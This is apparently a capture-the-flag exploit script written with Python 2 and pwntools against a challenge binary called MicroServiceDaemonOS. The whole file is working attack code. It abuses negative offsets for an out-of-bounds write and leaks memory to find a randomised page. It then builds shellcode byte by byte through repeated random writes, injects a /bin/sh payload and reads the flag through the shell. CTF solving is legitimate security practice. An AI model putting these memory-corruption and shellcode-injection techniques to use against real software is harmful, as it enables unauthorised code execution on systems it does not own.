#!/usr/bin/python2

from pwn import *
from argparse import ArgumentParser

# GDB initial commands
gdb_commands = """
brva 0x2061
continue
"""

# Variables
LOCAL = False
DEBUG = False

# Arch
context.arch = 'amd64'

# Binaries
BINARY = ELF('./MicroServiceDaemonOS')

def debug(c):
    if DEBUG and LOCAL:
        gdb.attach(c, gdb_commands)

def addTrustlet(c, t_type):
    c.recvuntil('command: ')
    c.sendline('l')
    c.recvuntil('Provide type of trustlet: ')
    c.sendline(str(t_type))

def startTrustletOne(c, index, t_type, size=0, offset=0, data=''):
    c.recvuntil('command: ')
    c.sendline('c')
    c.recvuntil('Provide index of ms: ')
    c.sendline(str(index))
    c.recvuntil('Call type: ')
    c.sendline(t_type)
    if t_type == 's':
        c.recvuntil('Provide data size: ')
        c.sendline(str(size))
        c.recvuntil('Provide data offset: ')
        c.sendline(str(offset))
        c.send(data)
        return c.recvuntil('Provide').split('\n')[0]
    return ''

def startTrustletZero(c, index, t_type, offset=0, count=0):
    c.recvuntil('command: ')
    c.sendline('c')
    c.recvuntil('Provide index of ms: ')
    c.sendline(str(index))
    c.recvuntil('Call type: ')
    c.sendline(t_type)
    if t_type == 'g':
        c.recvuntil('Provide page offset: ')
        c.sendline(str(offset))
        c.recvuntil('Provide page count: ')
        c.sendline(str(count))
        return c.recvuntil('Provide').split('\n')[0]
    return ''

def exploit():
    if LOCAL:
        c = process('./MicroServiceDaemonOS', aslr=False)
    else:
        c = remote('microservicedaemonos.ctfcompetition.com', 1337)

    #################################################
    ################# EXPLOIT HERE ##################
    #################################################

    debug(c)
    addTrustlet(c, 0)
    addTrustlet(c, 1)
    startTrustletOne(c, 1, 's', 4, -134217728, 'AAAA')
    val1 = startTrustletZero(c, 0, 'g', 0, 1)
    val2 = startTrustletZero(c, 0, 'g', 1, 1)
    if val1 != val2:
        print 'Unlucky bro!'
        exit()
    val = startTrustletZero(c, 0, 'g', 2, 32726)

    # Find the random index
    random = 2
    for i in range(0, len(val), 4):
        if val[i : i + 4] != val1:
            break
        random += 1
    print 'Random index is: ' + hex(random)

    offset = 0x4000 + (random << 12)


    # Writing in second function a shellcode randomly x)

    instructions = ['xor edi, edi', 'mov rsi, rax']
    print 'Instructions to write: ' + str(instructions)
    finished = False
    while not finished:
        rand = startTrustletOne(c, 1, 's', 4, -offset, 'AAAA')
        if len(rand) > 0:
            for inst in instructions:
                if rand[0] == asm(inst)[0]:
                    print 'Writing ' + str(inst) + '...'
                    asm_instr = asm(inst)
                    offset -= 1
                    j = 1
                    while j < len(asm_instr):
                        rand = startTrustletOne(c, 1, 's', 4, -offset, 'AAAA')
                        if len(rand) > 0 and rand[0] == asm_instr[j]:
                            offset -= 1
                            j += 1
                    print 'Done'
                    if inst == 'mov rsi, rax':
                        instructions.remove('mov rsi, rax')
                        print 'Appended: xor eax, eax'
                        instructions.append('xor eax, eax')
                    elif inst == 'xor edi, edi':
                        instructions.remove('xor edi, edi')
                    elif inst == 'xor eax, eax':
                        instructions.remove('xor eax, eax')
                    elif inst == 'syscall':
                        print 'Appended: syscall'
                        finished = True
                    if len(instructions) == 0:
                        instructions.append('syscall')
                    print 'Instructions left: ' + str(instructions)

    startTrustletOne(c, 1, 'g') 
    c.sendline('\x90' * 0xb + asm(shellcraft.amd64.linux.sh()))
    c.sendline('cat flag')
    c.interactive()

if __name__ == '__main__':
    # Parsing arguments
    parser = ArgumentParser()
    parser.add_argument('-l','--local', help='Exploit tested in local', action='store_true')
    parser.add_argument('-d','--debug', help='Enables debug', action='store_true')
    args = parser.parse_args()
    if args.local:
        LOCAL = True
    if args.debug:
        DEBUG = True
    exploit()